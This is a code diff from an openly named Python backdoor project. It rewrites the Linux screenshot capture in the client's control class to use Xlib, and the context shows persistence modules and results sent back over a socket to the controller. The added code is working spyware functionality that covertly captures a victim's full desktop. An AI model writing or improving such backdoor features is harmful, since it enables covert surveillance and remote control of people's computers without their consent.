@@ -6,7 +6,6 @@ https://github.com/xp4xbox/Python-Backdoor
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import abc
-import ctypes
 import os
 import subprocess
 import sys
@@ -16,6 +15,9 @@ from PIL import Image
 
 from src import helper, errors
 from src.definitions import platforms
+
+if platforms.OS == platforms.LINUX:
+    from Xlib import display, X
 
 if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
@@ -88,15 +90,22 @@ class Control(metaclass=abc.ABCMeta):
             self.socket.send_json(ERROR, str(e))
 
     def screenshot(self):
-        # since pyscreeze doesn't work on linux
         if platforms.OS == platforms.LINUX:
-            screenshot = helper.loadlib("linux/screenshot.so")
-            w = 1440
-            h = 900
-            screenshot.getScreen.argtypes = []
-            result = (ctypes.c_ubyte * w * h * 3)()
-            screenshot.getScreen(w, h, result)
-            image = Image.frombuffer("RGB", (w, h), result, "raw", "RGB", 0, 1)
+            try:
+                dsp = display.Display()
+
+                root = dsp.screen().root
+                desktop = root.get_geometry()
+                w = desktop.width
+                h = desktop.height
+
+                raw_byt = root.get_image(0, 0, w, h, X.ZPixmap, 0xffffffff)
+                image = Image.frombuffer("RGB", (w, h), raw_byt.data, "raw", "BGRX")
+
+                dsp.close()
+            except Exception as e:
+                self.socket.send(ERROR, str(e))
+                return
         else:
             image = pyscreeze.screenshot()
 
